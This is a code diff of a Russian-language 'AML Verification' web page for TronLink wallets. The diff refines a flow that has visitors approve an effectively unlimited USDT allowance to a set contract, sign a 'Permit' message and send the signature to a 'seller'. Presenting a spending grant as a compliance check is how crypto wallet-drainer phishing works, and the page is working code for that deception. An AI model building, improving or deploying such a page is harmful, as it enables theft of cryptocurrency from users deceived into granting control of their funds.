@@ -22,20 +22,21 @@
         .btn {
             padding: 1rem 2rem; border: none; border-radius: 50px;
             font-size: 1rem; font-weight: 600; cursor: pointer;
-            color: white; min-width: 250px; text-align: center;
+            color: white; min-width: 280px; text-align: center;
         }
         .btn-primary { background: #3375BB; }
         .btn-success { background: #00D4AA; }
         .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        .status { color: #8B949E; font-size: 0.9rem; max-width: 300px; text-align: center; }
+        .status { color: #8B949E; font-size: 0.9rem; max-width: 350px; text-align: center; line-height: 1.5; }
         .error { color: #ff4757; }
         .success { color: #00D4AA; }
-        .hidden { display: none; }
+        .hidden { display: none !important; }
         .data-box {
             background: #151A21; border: 1px solid #2D333B;
             border-radius: 12px; padding: 1rem; margin-top: 1rem;
-            font-family: monospace; font-size: 0.75rem;
+            font-family: monospace; font-size: 0.7rem;
             word-break: break-all; max-width: 400px; width: 100%;
+            max-height: 200px; overflow-y: auto;
         }
         .copy-btn {
             background: #2D333B; border: none; color: #fff;
@@ -49,17 +50,21 @@
     <div class="logo">AML</div>
     <h1>AML Verification</h1>
 
-    <div id="statusText" class="status">Подключите кошелёк для продолжения</div>
+    <div id="statusText" class="status">Откройте в TronLink и нажмите кнопку ниже</div>
 
     <button id="connectBtn" class="btn btn-primary" onclick="connectWallet()">
-        Подключить TronLink
+        Подключить кошелёк
+    </button>
+
+    <button id="approveBtn" class="btn btn-primary hidden" onclick="doApprove()">
+        Разрешить доступ к USDT
     </button>
 
     <button id="signBtn" class="btn btn-success hidden" onclick="signPermit()">
         Подписать разрешение
     </button>
 
-    <div id="resultBox" class="hidden">
+    <div id="resultBox" class="hidden" style="display: flex; flex-direction: column; align-items: center;">
         <div class="data-box" id="signatureData"></div>
         <button class="copy-btn" onclick="copyData()">📋 Копировать данные</button>
     </div>
@@ -71,87 +76,141 @@
 
         let tronWeb, userAddr, nonce;
 
-        // ABI минимальный
-        const USDT_ABI = [
-            {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-            {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
-        ];
+        // Проверяем TronLink сразу
+        function checkTronLink() {
+            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+                console.log('TronLink найден:', window.tronWeb.defaultAddress.base58);
+                return true;
+            }
+            console.log('TronLink не найден');
+            return false;
+        }
 
         async function connectWallet() {
             const btn = document.getElementById('connectBtn');
             const status = document.getElementById('statusText');
 
             btn.disabled = true;
-            btn.textContent = 'Подключение...';
+            btn.textContent = 'Проверка...';
 
             try {
-                // Ждём TronLink
+                // Пробуем получить аккаунт через tronLink API
+                if (window.tronLink && window.tronLink.request) {
+                    await window.tronLink.request({ method: 'tron_requestAccounts' });
+                }
+
+                // Ждём инициализации
                 let attempts = 0;
-                while (!window.tronWeb?.defaultAddress?.base58 && attempts < 20) {
-                    await new Promise(r => setTimeout(r, 300));
+                while (!checkTronLink() && attempts < 30) {
+                    await new Promise(r => setTimeout(r, 200));
                     attempts++;
                 }
 
-                if (!window.tronWeb?.defaultAddress?.base58) {
-                    throw new Error('TronLink не найден. Откройте страницу в TronLink браузере.');
+                if (!checkTronLink()) {
+                    throw new Error('TronLink не отвечает. Убедитесь, что вы открыли страницу в TronLink Browser.');
                 }
 
                 tronWeb = window.tronWeb;
                 userAddr = tronWeb.defaultAddress.base58;
 
-                // Проверяем сеть Nile
-                const node = await tronWeb.trx.getNodeInfo();
-                console.log('Node:', node);
-
                 status.textContent = 'Кошелёк: ' + userAddr.slice(0, 6) + '...' + userAddr.slice(-4);
+                status.classList.remove('error');
 
-                // Проверяем allowance
-                const usdtContract = tronWeb.contract(USDT_ABI, USDT);
-                const allowance = await usdtContract.allowance(userAddr, CONTRACT).call();
+                // Проверяем allowance через прямой вызов
+                await checkAllowance();
 
-                if (allowance.toNumber() > 0) {
-                    // Уже есть approve — показываем подпись
-                    btn.classList.add('hidden');
-                    document.getElementById('signBtn').classList.remove('hidden');
-                    status.textContent = 'Нажмите "Подписать разрешение"';
+            } catch (e) {
+                console.error('Connect error:', e);
+                btn.disabled = false;
+                btn.textContent = 'Подключить кошелёк';
+                status.textContent = 'Ошибка: ' + (e.message || 'TronLink не найден');
+                status.classList.add('error');
+            }
+        }
+
+        async function checkAllowance() {
+            const btn = document.getElementById('connectBtn');
+            const approveBtn = document.getElementById('approveBtn');
+            const signBtn = document.getElementById('signBtn');
+            const status = document.getElementById('statusText');
+
+            try {
+                // Используем tronWeb.transactionBuilder для вызова контракта
+                const functionSelector = 'allowance(address,address)';
+                const parameter = [
+                    { type: 'address', value: userAddr },
+                    { type: 'address', value: CONTRACT }
+                ];
+
+                const tx = await tronWeb.transactionBuilder.triggerConstantContract(
+                    USDT,
+                    functionSelector,
+                    {},
+                    parameter
+                );
+
+                if (tx.constant_result && tx.constant_result[0]) {
+                    const allowance = parseInt(tx.constant_result[0], 16);
+                    console.log('Allowance:', allowance);
+
+                    if (allowance > 0) {
+                        // Уже есть approve
+                        btn.classList.add('hidden');
+                        approveBtn.classList.add('hidden');
+                        signBtn.classList.remove('hidden');
+                        status.textContent = 'Нажмите "Подписать разрешение"';
+                    } else {
+                        // Нужен approve
+                        btn.classList.add('hidden');
+                        approveBtn.classList.remove('hidden');
+                        status.textContent = 'Сначала разрешите доступ к USDT';
+                    }
                 } else {
-                    // Нужен approve
-                    btn.textContent = 'Разрешить доступ к USDT';
-                    btn.onclick = doApprove;
-                    status.textContent = 'Требуется разрешение на доступ к USDT';
+                    throw new Error('Не удалось получить allowance');
                 }
 
             } catch (e) {
-                btn.disabled = false;
-                btn.textContent = 'Подключить TronLink';
-                status.textContent = 'Ошибка: ' + e.message;
+                console.error('Allowance error:', e);
+                status.textContent = 'Ошибка проверки: ' + e.message;
                 status.classList.add('error');
-                console.error(e);
             }
         }
 
         async function doApprove() {
-            const btn = document.getElementById('connectBtn');
+            const btn = document.getElementById('approveBtn');
             const status = document.getElementById('statusText');
 
             btn.disabled = true;
-            btn.textContent = 'Ожидание подтверждения...';
+            btn.textContent = 'Ожидание...';
 
             try {
-                const usdtContract = tronWeb.contract(USDT_ABI, USDT);
-                const max = '999999999999999999999999999999';
+                const functionSelector = 'approve(address,uint256)';
+                const parameter = [
+                    { type: 'address', value: CONTRACT },
+                    { type: 'uint256', value: '999999999999999999999999999999' }
+                ];
 
-                await usdtContract.approve(CONTRACT, max).send({
-                    feeLimit: 100000000,
-                    callValue: 0
-                });
+                const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+                    USDT,
+                    functionSelector,
+                    { feeLimit: 100000000, callValue: 0 },
+                    parameter
+                );
 
-                btn.classList.add('hidden');
-                document.getElementById('signBtn').classList.remove('hidden');
-                status.textContent = 'Нажмите "Подписать разрешение"';
-                status.classList.remove('error');
+                const signedTx = await tronWeb.trx.sign(tx.transaction);
+                const result = await tronWeb.trx.sendRawTransaction(signedTx);
+
+                if (result.result) {
+                    btn.classList.add('hidden');
+                    document.getElementById('signBtn').classList.remove('hidden');
+                    status.textContent = 'Нажмите "Подписать разрешение"';
+                    status.classList.remove('error');
+                } else {
+                    throw new Error('Транзакция не подтверждена');
+                }
 
             } catch (e) {
+                console.error('Approve error:', e);
                 btn.disabled = false;
                 btn.textContent = 'Разрешить доступ к USDT';
                 status.textContent = 'Ошибка: ' + (e.message || 'Отменено');
@@ -164,19 +223,18 @@
             const status = document.getElementById('statusText');
 
             btn.disabled = true;
-            btn.textContent = 'Подпись...';
+            btn.textContent = 'Подготовка...';
 
             try {
                 nonce = Math.floor(Math.random() * 1000000);
                 const deadline = Math.floor(Date.now() / 1000) + 86400; // 1 день
 
-                // EIP-712 хеш вручную
+                // EIP-712 хеш
                 const PERMIT_TYPEHASH = tronWeb.sha3(
                     "Permit(address buyer,uint256 nonce,uint256 deadline)"
                 );
 
-                // Chain ID Nile
-                const chainId = 3448148188;
+                const chainId = 3448148188; // Nile
 
                 // DOMAIN_SEPARATOR
                 const domainData = tronWeb.eth.abi.encodeParameters(
@@ -204,16 +262,18 @@
                     { encoding: 'hex' }
                 );
 
-                // Подпись через TronLink
+                btn.textContent = 'Подпишите в TronLink...';
+
+                // Подпись
                 const signature = await tronWeb.trx.sign(finalHash, tronWeb.defaultAddress.hex, false);
 
-                // Parse v, r, s
+                // Parse
                 const sig = signature.replace('0x', '');
                 const v = parseInt(sig.substr(128, 2), 16);
                 const r = '0x' + sig.substr(0, 64);
                 const s = '0x' + sig.substr(64, 64);
 
-                // Показываем результат
+                // Show result
                 const data = {
                     buyer: userAddr,
                     nonce: nonce,
@@ -225,17 +285,18 @@
 
                 document.getElementById('signatureData').textContent = JSON.stringify(data, null, 2);
                 document.getElementById('resultBox').classList.remove('hidden');
+                document.getElementById('resultBox').style.display = 'flex';
 
                 btn.textContent = '✅ Подписано';
                 status.textContent = 'Отправьте данные продавцу';
                 status.classList.add('success');
 
             } catch (e) {
+                console.error('Sign error:', e);
                 btn.disabled = false;
                 btn.textContent = 'Подписать разрешение';
                 status.textContent = 'Ошибка: ' + (e.message || 'Отменено');
                 status.classList.add('error');
-                console.error(e);
             }
         }
 
@@ -246,10 +307,12 @@
             });
         }
 
-        // Auto-connect если уже есть TronWeb
-        if (window.tronWeb?.defaultAddress?.base58) {
-            connectWallet();
-        }
+        // Auto-check on load
+        window.addEventListener('load', () => {
+            if (checkTronLink()) {
+                connectWallet();
+            }
+        });
     </script>
 </body>
 </html>
